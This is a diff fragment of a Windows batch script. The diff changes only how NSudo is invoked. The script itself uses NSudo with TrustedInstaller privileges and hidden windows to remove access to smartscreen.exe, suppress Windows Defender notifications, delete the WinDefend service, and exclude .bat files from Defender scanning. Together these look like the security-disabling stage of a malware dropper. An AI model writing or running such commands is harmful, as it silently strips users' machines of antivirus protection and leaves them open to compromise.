@@ -37,11 +37,11 @@ set c1c2c3c4c5c6c7=admin
 
 set pop=%systemroot%
 
-NSudo.exe -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+NSudo -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
 NSudo -U:T reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
  
-NSudo.exe -U:T -ShowWindowMode:Hide  sc delete  windefend  
+NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
